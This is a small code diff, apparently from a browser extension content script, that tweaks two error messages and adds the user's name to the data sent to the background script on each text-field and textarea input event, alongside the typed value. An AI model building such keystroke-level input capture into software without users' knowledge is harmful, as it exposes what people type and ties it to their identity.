@@ -12,12 +12,12 @@ async function sendMessageToBackground(message: any) {
         lastMessageSentTime = Date.now();
         console.log(`Message sent successfully:`, response.message);
       } else {
-        console.warn('Failed to enrich and send message:', response?.error);
+        console.warn('Failed to send message:', response?.error);
       }
     });
 
   } catch (err) {
-    console.error('Failed to send message:', err);
+    console.error('Exceptiom: message failed:', err);
   }
 }
 
@@ -51,6 +51,7 @@ const inputHandler = (event: Event) => {
     sendMessageToBackground({
       type: 'user_input',
       timestamp: new Date().toISOString(),
+      username: getUsername(),
       inputType: target instanceof HTMLTextAreaElement ? 'textarea' : 'text',
       value: target.value,
       pageLoadTime: pageLoadTime,
